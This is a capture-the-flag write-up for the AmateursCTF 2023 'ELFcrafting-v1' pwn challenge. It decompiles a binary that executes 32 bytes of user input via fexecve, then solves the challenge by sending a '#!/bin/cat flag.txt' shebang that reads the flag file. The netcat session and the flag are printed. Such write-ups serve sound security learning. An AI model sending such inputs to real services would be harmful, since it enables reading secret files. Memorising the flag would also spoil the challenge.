# AmateursCTF 2023

## ELFcrafting-v1

> How well do you understand the ELF file format?
>
> Author: unvariant
>
> [`chal`](chal) [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution

For this challenge we have a binary and a Dockerfile. Putting the binary to Ghidra brings the following short program.

```c
undefined8 main(undefined8 param_1,char **param_2,char **param_3)

{
  int iVar1;
  ulong uVar2;
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("I\'m sure you all enjoy doing shellcode golf problems.");
  puts("But have you ever tried ELF golfing?");
  puts("Have fun!");
  iVar1 = memfd_create(&DAT_0010206f,0);
  if (iVar1 < 0) {
    perror("failed to execute fd = memfd_create(\"golf\", 0)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar2 = read(0,local_38,0x20);
  if ((int)uVar2 < 0) {
    perror("failed to execute ok = read(0, buffer, 32)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("read %d bytes from stdin\n",uVar2 & 0xffffffff);
  uVar2 = write(iVar1,local_38,(long)(int)uVar2);
  if ((int)uVar2 < 0) {
    perror("failed to execute ok = write(fd, buffer, ok)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("wrote %d bytes to file\n",uVar2 & 0xffffffff);
  iVar1 = fexecve(iVar1,param_2,param_3);
  if (iVar1 < 0) {
    perror("failed to execute fexecve(fd, argv, envp)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

What happens here is that with `memfd_create` an anonymous file is created, 32 bytes of data are read from user input and written to that file. Afterwards the file is passed to `fexecve` and run. The task is somewhat clear, we need to craft an executable and pass it to the application. But a 32 byte long `elf`, thats really small and not doable.

Reading the man pages of [`fexecve`](https://man7.org/linux/man-pages/man3/fexecve.3.html) gives the following information.

> fexecve() performs the same task as execve(2), with the difference that the file to be executed is specified via a file descriptor, fd, rather than via a pathname.  The file descriptor fd must be opened read-only (O_RDONLY) or with the O_PATH flag and the caller must have permission to execute the file that it refers to.

Ok, navigating to `execve` to check the behaviour. The man page states:

> execve() executes the program referred to by pathname.  This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
>
> pathname must be either a binary executable, or a script starting with a line of the form:
>
> #!interpreter [optional-arg]
>
> For details of the latter case, see "Interpreter scripts" below.

So, we don't *need* to pass an elf, we also call any script that is installed on the target machine, for instance `cat` in form of `#!/bin/cat flag.txt`.

```bash
$ nc amt.rs 31178
I'm sure you all enjoy doing shellcode golf problems.
But have you ever tried ELF golfing?
Have fun!
#!/bin/cat flag.txt
read 20 bytes from stdin
wrote 20 bytes to file
amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}
```

Flag `amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}`